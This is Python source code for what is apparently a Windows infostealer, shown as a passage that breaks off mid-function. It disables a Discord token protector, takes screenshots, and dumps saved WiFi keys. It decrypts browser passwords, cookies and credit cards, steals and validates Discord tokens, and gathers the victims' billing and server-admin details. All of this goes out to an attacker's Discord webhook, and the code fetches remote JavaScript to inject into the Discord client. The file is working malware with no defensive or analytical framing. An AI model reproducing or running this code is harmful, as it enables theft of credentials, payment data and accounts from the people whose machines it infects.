class check:
    def __read__():
        roaming = os.getenv('APPDATA')
        try:
            with open(f'{roaming}//f35ee3fc-b929-11ed-afa1-0242ac120002.f97a0b4a-b929-11ed-afa1-0242ac120002.dll', 'r') as f:
                return False
        except:
            # Continue #
            return True
    def __write__():
        roaming = os.getenv('APPDATA')
        try:
            with open(f'{roaming}//f35ee3fc-b929-11ed-afa1-0242ac120002.f97a0b4a-b929-11ed-afa1-0242ac120002.dll', 'w') as f:
                return False
        except:
            # Continue #
            return True

class protect_proc:
    def __init__():
        roaming = os.getenv('APPDATA')
        path = f"{roaming}\\DiscordTokenProtector\\"
        config = path + "config.json"

        if not os.path.exists(path):
            return

        for process in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(path + process)
            except FileNotFoundError:
                pass

        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420

            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)

class sysHook:
    __LAPPDATA__ = os.getenv('LOCALAPPDATA')
    __PATH__ = f"{__LAPPDATA__}\\msi"

    class SystemInfo():
        def __init__(self, webhook: str) -> None:
            webhook = SyncWebhook.from_url(webhook)
            embed = Embed(title="System Information", color=0x000000)

            embed.add_field(
                name=self.user_data()[0],
                value=self.user_data()[1],
                inline=self.user_data()[2]
            )
            embed.add_field(
                name=self.system_data()[0],
                value=self.system_data()[1],
                inline=self.system_data()[2]
            )
            embed.add_field(
                name=self.disk_data()[0],
                value=self.disk_data()[1],
                inline=self.disk_data()[2]
            )
            embed.add_field(
                name=self.network_data()[0],
                value=self.network_data()[1],
                inline=self.network_data()[2]
            )
            embed.add_field(
                name=self.wifi_data()[0],
                value=self.wifi_data()[1],
                inline=self.wifi_data()[2]
            )

            image = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            try:
                os.makedirs(f"{bHook.__PATH__}")
            except:
                pass
            image.save(f"{bHook.__PATH__}\\screenshot.png")
            embed.set_image(url=f"attachment://{bHook.__PATH__}\\screenshot.png")

            try:
                webhook.send(
                    embed=embed,
                    file=File(f'{bHook.__PATH__}\\screenshot.png', filename=f'{bHook.__PATH__}\\screenshot.png'),
                    username=f"{js_bot.js_webhook_name}",
                    avatar_url=f"{js_bot.js_avatar_url}"
                )
            except:
                pass

            if os.path.exists(f"{bHook.__PATH__}\\screenshot.png"):
                os.remove(f"{bHook.__PATH__}\\screenshot.png")

        def user_data(self) -> tuple[str, str, bool]:
            def display_name() -> str:
                GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
                NameDisplay = 3

                size = ctypes.pointer(ctypes.c_ulong(0))
                GetUserNameEx(NameDisplay, None, size)

                nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
                GetUserNameEx(NameDisplay, nameBuffer, size)

                return nameBuffer.value

            display_name = display_name()
            hostname = os.getenv('COMPUTERNAME')
            username = os.getenv('USERNAME')

            return (
                ":bust_in_silhouette: User",
                f"```Display Name: {display_name}\nHostname: {hostname}\nUsername: {username}```",
                False
            )

        def system_data(self) -> tuple[str, str, bool]:
            def get_hwid() -> str:
                try:
                    hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
                                                stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
                except:
                    hwid = "None"

                return hwid

            cpu = wmi.WMI().Win32_Processor()[0].Name
            gpu = wmi.WMI().Win32_VideoController()[0].Name
            ram = round(float(wmi.WMI().Win32_OperatingSystem()[
                        0].TotalVisibleMemorySize) / 1048576, 0)
            hwid = get_hwid()

            return (
                "<:CPU:1004131852208066701> System",
                f"```CPU: {cpu}\nGPU: {gpu}\nRAM: {ram}\nHWID: {hwid}```",
                False
            )

        def disk_data(self) -> tuple[str, str, bool]:
            disk = ("{:<9} "*4).format("Drive", "Free", "Total", "Use%") + "\n"
            for part in psutil.disk_partitions(all=False):
                if os.name == 'nt':
                    if 'cdrom' in part.opts or part.fstype == '':
                        continue
                usage = psutil.disk_usage(part.mountpoint)
                disk += ("{:<9} "*4).format(part.device, str(
                    usage.free // (2**30)) + "GB", str(usage.total // (2**30)) + "GB", str(usage.percent) + "%") + "\n"

            return (
                ":floppy_disk: Disk",
                f"```{disk}```",
                False
            )

        def network_data(self) -> tuple[str, str, bool]:
            def geolocation(ip: str) -> str:
                url = f"http://ip-api.com/json/{ip}"
                response = requests.get(url, headers={
                                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
                data = response.json()

                return (data["country"], data["regionName"], data["city"], data["zip"], data["as"])

            ip = requests.get("https://api.ipify.org").text
            mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
            country, region, city, zip_, as_ = geolocation(ip)

            return (
                ":satellite: Network",
                "```IP Address: {ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city} ({zip_})\nISP: {as_}```".format(
                    ip=ip, mac=mac, country=country, region=region, city=city, zip_=zip_, as_=as_),
                False
            )

        def wifi_data(self) -> tuple[str, str, bool]:
            networks, out = [], ''
            try:
                wifi = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profiles'], shell=True,
                    stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
                wifi = [i.split(":")[1][1:-1]
                        for i in wifi if "All User Profile" in i]

                for name in wifi:
                    try:
                        results = subprocess.check_output(
                            ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], shell=True,
                            stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
                        results = [b.split(":")[1][1:-1]
                                   for b in results if "Key Content" in b]
                    except subprocess.CalledProcessError:
                        networks.append((name, ''))
                        continue

                    try:
                        networks.append((name, results[0]))
                    except IndexError:
                        networks.append((name, ''))

            except subprocess.CalledProcessError:
                pass
            except UnicodeDecodeError:
                pass

            out += f'{"SSID":<20}| {"PASSWORD":<}\n'
            out += f'{"-"*20}|{"-"*29}\n'
            for name, password in networks:
                out += '{:<20}| {:<}\n'.format(name, password)

            return (
                ":signal_strength: WiFi",
                f"```{out}```",
                False
            )













class bHook:
    __LOGINS__ = []
    __COOKIES__ = []
    __WEB_HISTORY__ = []
    __DOWNLOADS__ = []
    __CARDS__ = []

    __LAPPDATA__ = os.getenv('LOCALAPPDATA')
    __PATH__ = f"{__LAPPDATA__}\\msi"

    class Browsers:
        def __init__(self, webhook):
            self.webhook = SyncWebhook.from_url(webhook)
            bHook.Chromium()
            bHook.Upload(self.webhook)
            bHook.Upload.clean(self=self)

    class Upload:
        def __init__(self, webhook: SyncWebhook):
            self.webhook = webhook
            self.write_files()
            self.send()
            self.clean()

        def write_files(self):
            os.makedirs(f"{bHook.__PATH__}", exist_ok=True)
            if bHook.__LOGINS__:
                with open(f"{bHook.__PATH__}\\logins.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in bHook.__LOGINS__))

            if bHook.__COOKIES__:
                with open(f"{bHook.__PATH__}\\cookies.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in bHook.__COOKIES__))

            if bHook.__WEB_HISTORY__:
                with open(f"{bHook.__PATH__}\\web_history.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in bHook.__WEB_HISTORY__))

            if bHook.__DOWNLOADS__:
                with open(f"{bHook.__PATH__}\\downloads.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in bHook.__DOWNLOADS__))

            if bHook.__CARDS__:
                with open(f"{bHook.__PATH__}\\cards.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in bHook.__CARDS__))

            with ZipFile(f"{bHook.__PATH__}\\vault.zip", "w") as zip:
                for file in os.listdir(f"{bHook.__PATH__}"):
                    if file == "vault.zip":
                        pass
                    else:
                        zip.write(f"{bHook.__PATH__}\\{file}", file)

        def send(self):
            self.webhook.send(
                embed=Embed(
                    title="Vault",
                    description="```" +
                    '\n'.join(self.tree(Path(f"{bHook.__PATH__}"))) + "```",
                ),
                file=File(f"{bHook.__PATH__}\\vault.zip"),
                username=f"{js_bot.js_webhook_name}",
                avatar_url=f"{js_bot.js_avatar_url}"
            )

        def clean(self):
            try:
                shutil.rmtree(f"{bHook.__PATH__}")
                os.remove("vault.zip")
            except:
                pass

        def tree(self, path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
            pipes = {
                'space':  '    ',
                'branch': '│   ',
                'tee':    '├── ',
                'last':   '└── ',
            }

            if prefix == '':
                yield midfix_folder + path.name

            contents = list(path.iterdir())
            pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
            for pointer, path in zip(pointers, contents):
                if path.is_dir():
                    yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
                    extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
                    yield from self.tree(path, prefix=prefix+extension)
                else:
                    yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"


    class Chromium:
        def __init__(self):
            self.appdata = os.getenv('LOCALAPPDATA')
            self.browsers = {
                'amigo': self.appdata + '\\Amigo\\User Data',
                'torch': self.appdata + '\\Torch\\User Data',
                'kometa': self.appdata + '\\Kometa\\User Data',
                'orbitum': self.appdata + '\\Orbitum\\User Data',
                'cent-browser': self.appdata + '\\CentBrowser\\User Data',
                '7star': self.appdata + '\\7Star\\7Star\\User Data',
                'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
                'vivaldi': self.appdata + '\\Vivaldi\\User Data',
                'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
                'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
                'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
                'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
                'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
                'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
                'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
                'iridium': self.appdata + '\\Iridium\\User Data',
            }
            self.profiles = [
                'Default',
                'Profile 1',
                'Profile 2',
                'Profile 3',
                'Profile 4',
                'Profile 5',
            ]

            for _, path in self.browsers.items():
                if not os.path.exists(path):
                    continue

                self.master_key = self.get_master_key(f'{path}\\Local State')
                if not self.master_key:
                    continue

                for profile in self.profiles:
                    if not os.path.exists(path + '\\' + profile):
                        continue

                    operations = [
                        self.get_login_data,
                        self.get_cookies,
                        self.get_web_history,
                        self.get_downloads,
                        self.get_credit_cards,
                    ]

                    for operation in operations:
                        try:
                            operation(path, profile)
                        except Exception as e:
                            # print(e)
                            pass

        def get_master_key(self, path: str) -> str:
            if not os.path.exists(path):
                return

            if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
                return

            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)

            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key

        def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()

            return decrypted_pass

        def get_login_data(self, path: str, profile: str):
            login_db = f'{path}\\{profile}\\Login Data'
            if not os.path.exists(login_db):
                return

            shutil.copy(login_db, 'login_db')
            conn = sqlite3.connect('login_db')
            cursor = conn.cursor()
            cursor.execute(
                'SELECT action_url, username_value, password_value FROM logins')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2]:
                    continue

                password = self.decrypt_password(row[2], self.master_key)
                bHook.__LOGINS__.append(bHook.Types.Login(row[0], row[1], password))

            conn.close()
            os.remove('login_db')

        def get_cookies(self, path: str, profile: str):
            cookie_db = f'{path}\\{profile}\\Network\\Cookies'
            if not os.path.exists(cookie_db):
                return

            try:
                shutil.copy(cookie_db, 'cookie_db')
                conn = sqlite3.connect('cookie_db')
                cursor = conn.cursor()
                cursor.execute(
                    'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
                for row in cursor.fetchall():
                    if not row[0] or not row[1] or not row[2] or not row[3]:
                        continue

                    cookie = self.decrypt_password(row[3], self.master_key)
                    bHook.__COOKIES__.append(bHook.Types.Cookie(
                        row[0], row[1], row[2], cookie, row[4]))

                conn.close()
            except Exception as e:
                print(e)

            os.remove('cookie_db')

        def get_web_history(self, path: str, profile: str):
            web_history_db = f'{path}\\{profile}\\History'
            if not os.path.exists(web_history_db):
                return

            shutil.copy(web_history_db, 'web_history_db')
            conn = sqlite3.connect('web_history_db')
            cursor = conn.cursor()
            cursor.execute('SELECT url, title, last_visit_time FROM urls')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2]:
                    continue

                bHook.__WEB_HISTORY__.append(bHook.Types.WebHistory(row[0], row[1], row[2]))

            conn.close()
            os.remove('web_history_db')

        def get_downloads(self, path: str, profile: str):
            downloads_db = f'{path}\\{profile}\\History'
            if not os.path.exists(downloads_db):
                return

            shutil.copy(downloads_db, 'downloads_db')
            conn = sqlite3.connect('downloads_db')
            cursor = conn.cursor()
            cursor.execute('SELECT tab_url, target_path FROM downloads')
            for row in cursor.fetchall():
                if not row[0] or not row[1]:
                    continue

                bHook.__DOWNLOADS__.append(bHook.Types.Download(row[0], row[1]))

            conn.close()
            os.remove('downloads_db')

        def get_credit_cards(self, path: str, profile: str):
            cards_db = f'{path}\\{profile}\\Web Data'
            if not os.path.exists(cards_db):
                return

            shutil.copy(cards_db, 'cards_db')
            conn = sqlite3.connect('cards_db')
            cursor = conn.cursor()
            cursor.execute(
                'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue

                card_number = self.decrypt_password(row[3], self.master_key)
                bHook.__CARDS__.append(bHook.Types.CreditCard(
                    row[0], row[1], row[2], card_number, row[4]))

            conn.close()
            os.remove('cards_db')


    class Types:
        class Login:
            def __init__(self, url, username, password):
                self.url = url
                self.username = username
                self.password = password

            def __str__(self):
                return f'{self.url}\t{self.username}\t{self.password}'

            def __repr__(self):
                return self.__str__()

        class Cookie:
            def __init__(self, host, name, path, value, expires):
                self.host = host
                self.name = name
                self.path = path
                self.value = value
                self.expires = expires

            def __str__(self):
                return f'{self.host}\t{"FALSE" if self.expires == 0 else "TRUE"}\t{self.path}\t{"FALSE" if self.host.startswith(".") else "TRUE"}\t{self.expires}\t{self.name}\t{self.value}'

            def __repr__(self):
                return self.__str__()

        class WebHistory:
            def __init__(self, url, title, timestamp):
                self.url = url
                self.title = title
                self.timestamp = timestamp

            def __str__(self):
                return f'{self.url}\t{self.title}\t{self.timestamp}'

            def __repr__(self):
                return self.__str__()

        class Download:
            def __init__(self, tab_url, target_path):
                self.tab_url = tab_url
                self.target_path = target_path

            def __str__(self):
                return f'{self.tab_url}\t{self.target_path}'

            def __repr__(self):
                return self.__str__()

        class CreditCard:
            def __init__(self, name, month, year, number, date_modified):
                self.name = name
                self.month = month
                self.year = year
                self.number = number
                self.date_modified = date_modified

            def __str__(self):
                return f'{self.name}\t{self.month}\t{self.year}\t{self.number}\t{self.date_modified}'

            def __repr__(self):
                return self.__str__()













class dHook:
    class DiscordToken:
        def __init__(self, webhook):
            dHook.upload_tokens(webhook).upload()

    class extract_tokens:
        def __init__(self) -> None:
            self.base_url = "https://discord.com/api/v9/users/@me"
            self.appdata = os.getenv("localappdata")
            self.roaming = os.getenv("appdata")
            self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
            self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

            self.tokens, self.uids = [], []

            self.extract()

        def extract(self) -> None:
            paths = {
                'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
                'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
                'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
                'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
                'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
                'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
                'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
                'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
                'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
                'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
                'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
                '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
                'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
                'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
                'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
                'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
                'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
                'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
                'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
                'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
                'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
                'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
                'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
                'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
                'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
            }

            for name, path in paths.items():
                if not os.path.exists(path):
                    continue
                _discord = name.replace(" ", "").lower()
                if "cord" in path:
                    if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'):
                        continue
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.regexp_enc, line):
                                y = y.encode('ascii', 'ignore').decode('ascii')
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
                                if self.validate_token(token):
                                    uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                    if uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)

                else:
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(self.regexp, line):
                                if self.validate_token(token):
                                    uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                    if uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)

            if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                    for _file in files:
                        if not _file.endswith('.sqlite'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(self.regexp, line):
                                if self.validate_token(token):
                                    uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                    if uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)

        def validate_token(self, token: str) -> bool:
            r = requests.get(self.base_url, headers={'Authorization': token})

            if r.status_code == 200:
                return True

            return False

        def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()

            return decrypted_pass

        def get_master_key(self, path: str) -> str:
            if not os.path.exists(path):
                return

            if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
                return

            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)

            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

            return master_key

    class upload_tokens:
        def __init__(self, webhook: str):
            self.tokens = dHook.extract_tokens().tokens
            self.webhook = SyncWebhook.from_url(webhook)

        def calc_flags(self, flags: int) -> list:
            flags_dict = {
                "DISCORD_EMPLOYEE": {
                    "emoji": "<:staff:968704541946167357>",
                    "shift": 0,
                    "ind": 1
                },
                "DISCORD_PARTNER": {
                    "emoji": "<:partner:968704542021652560>",
                    "shift": 1,
                    "ind": 2
                },
                "HYPESQUAD_EVENTS": {
                    "emoji": "<:hypersquad_events:968704541774192693>",
                    "shift": 2,
                    "ind": 4
                },
                "BUG_HUNTER_LEVEL_1": {
                    "emoji": "<:bug_hunter_1:968704541677723648>",
                    "shift": 3,
                    "ind": 4
                },
                "HOUSE_BRAVERY": {
                    "emoji": "<:hypersquad_1:968704541501571133>",
                    "shift": 6,
                    "ind": 64
                },
                "HOUSE_BRILLIANCE": {
                    "emoji": "<:hypersquad_2:968704541883261018>",
                    "shift": 7,
                    "ind": 128
                },
                "HOUSE_BALANCE": {
                    "emoji": "<:hypersquad_3:968704541874860082>",
                    "shift": 8,
                    "ind": 256
                },
                "EARLY_SUPPORTER": {
                    "emoji": "<:early_supporter:968704542126510090>",
                    "shift": 9,
                    "ind": 512
                },
                "BUG_HUNTER_LEVEL_2": {
                    "emoji": "<:bug_hunter_2:968704541774217246>",
                    "shift": 14,
                    "ind": 16384
                },
                "VERIFIED_BOT_DEVELOPER": {
                    "emoji": "<:verified_dev:968704541702905886>",
                    "shift": 17,
                    "ind": 131072
                },
                "ACTIVE_DEVELOPER": {
                    "emoji": "<:Active_Dev:1045024909690163210>",
                    "shift": 22,
                    "ind": 4194304
                },
                "CERTIFIED_MODERATOR": {
                    "emoji": "<:certified_moderator:988996447938674699>",
                    "shift": 18,
                    "ind": 262144
                },
                "SPAMMER": {
                    "emoji": "⌨",
                    "shift": 20,
                    "ind": 1048704
                },
            }

            return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]


        def upload(self):
            if not self.tokens:
                return

            for token in self.tokens:
                user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
                billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
                guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
                friends = requests.get('https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}).json()
                gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()

                username = user['username'] + '#' + user['discriminator']
                user_id = user['id']
                email = user['email']
                phone = user['phone']
                mfa = user['mfa_enabled']
                avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
                badges = ' '.join([flag[0] for flag in self.calc_flags(user['public_flags'])])

                if user['premium_type'] == 0:
                    nitro = 'None'
                elif user['premium_type'] == 1:
                    nitro = 'Nitro Classic'
                elif user['premium_type'] == 2:
                    nitro = 'Nitro'
                elif user['premium_type'] == 3:
                    nitro = 'Nitro Basic'
                else:
                    nitro = 'None'

                try: # / CATCH / #
                    if billing:
                        payment_methods = []

                        for method in billing:
                            if method['type'] == 1:
                                payment_methods.append('💳')

                            elif method['type'] == 2:
                                payment_methods.append("<:paypal:973417655627288666>")

                            else:
                                payment_methods.append('❓')

                        payment_methods = ', '.join(payment_methods)

                    else:
                        payment_methods = None
                except:
                    payment_methods = None

                try: # / CATCH / #
                    if guilds:
                        hq_guilds = []
                        for guild in guilds:
                            admin = True if guild['permissions'] == '4398046511103' else False
                            if admin and guild['approximate_member_count'] >= 100:
                                owner = "✅" if guild['owner'] else "❌"

                                invites = requests.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
                                if len(invites) > 0:
                                    invite = f"https://discord.gg/{invites[0]['code']}"
                                else:
                                    invite = "https://youtu.be/dQw4w9WgXcQ"

                                data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"

                                if len('\n'.join(hq_guilds)) + len(data) >= 1024:
                                    break

                                hq_guilds.append(data)

                        if len(hq_guilds) > 0:
                            hq_guilds = '\n'.join(hq_guilds)

                        else:
                            hq_guilds = None

                    else:
                        hq_guilds = None
                except:
                    hq_guilds = None

                try: # / CATCH / #
                    if friends:
                        hq_friends = []
                        for friend in friends:
                            unprefered_flags = [64, 128, 256, 1048704]
                            inds = [flag[1] for flag in self.calc_flags(
                                friend['user']['public_flags'])[::-1]]
                            for flag in unprefered_flags:
                                inds.remove(flag) if flag in inds else None
                            if inds != []:
                                hq_badges = ' '.join([flag[0] for flag in self.calc_flags(
                                    friend['user']['public_flags'])[::-1]])

                                data = f"{hq_badges} - `{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})`"

                                if len('\n'.join(hq_friends)) + len(data) >= 1024:
                                    break

                                hq_friends.append(data)

                        if len(hq_friends) > 0:
                            hq_friends = '\n'.join(hq_friends)

                        else:
                            hq_friends = None

                    else:
                        hq_friends = None
                except:
                    hq_friends = None

                try: # / CATCH / #
                    if gift_codes:
                        codes = []
                        for code in gift_codes:
                            name = code['promotion']['outbound_title']
                            code = code['code']

                            data = f":gift: `{name}`\n:ticket: `{code}`"

                            if len('\n\n'.join(codes)) + len(data) >= 1024:
                                break

                            codes.append(data)

                        if len(codes) > 0:
                            codes = '\n\n'.join(codes)

                        else:
                            codes = None

                    else:
                        codes = None
                except:
                    codes = None

                embed = Embed(title=f"{username} ({user_id})", color=0x000000)
                embed.set_thumbnail(url=avatar)

                embed.add_field(name="<a:pinkcrown:996004209667346442> Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
                embed.add_field(name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
                embed.add_field(name="<a:redboost:996004230345281546> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
                embed.add_field(name="<a:pinklv:996004222090891366> Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
                embed.add_field(name="<:mfa:1021604916537602088> MFA:", value=f"{mfa}", inline=True)

                embed.add_field(name="\u200b", value="\u200b", inline=False)

                embed.add_field(name="<a:rainbowheart:996004226092245072> Email:", value=f"{email if email != None else 'None'}", inline=True)
                embed.add_field(name="<:starxglow:996004217699434496> Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    

                embed.add_field(name="\u200b", value="\u200b", inline=False)

                if hq_guilds != None:
                    embed.add_field(name="<a:earthpink:996004236531859588> HQ Guilds:", value=hq_guilds, inline=False)
                    embed.add_field(name="\u200b", value="\u200b", inline=False)

                if hq_friends != None:
                    embed.add_field(name="<a:earthpink:996004236531859588> HQ Friends:", value=hq_friends, inline=False)
                    embed.add_field(name="\u200b", value="\u200b", inline=False)

                if codes != None:
                    embed.add_field(name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
                    embed.add_field(name="\u200b", value="\u200b", inline=False)

                embed.set_footer(text="Hooked")

                self.webhook.send(embed=embed, username=f"{js_bot.js_webhook_name}", avatar_url=f"{js_bot.js_avatar_url}")



class Injection:
    def __init__(self, webhook: str) -> None:
        self.appdata = os.getenv('LOCALAPPDATA')
        self.discord_dirs = [
            self.appdata + '\\Discord',
            self.appdata + '\\DiscordCanary',
            self.appdata + '\\DiscordPTB',
            self.appdata + '\\DiscordDevelopment'
        ]
        self.code = requests.get('https://raw.githubusercontent.com/Zurek0x/RebelWare/main/hook.js').text
        
        try:
            for proc in psutil.process_iter():
                if 'discord' in proc.name().lower():
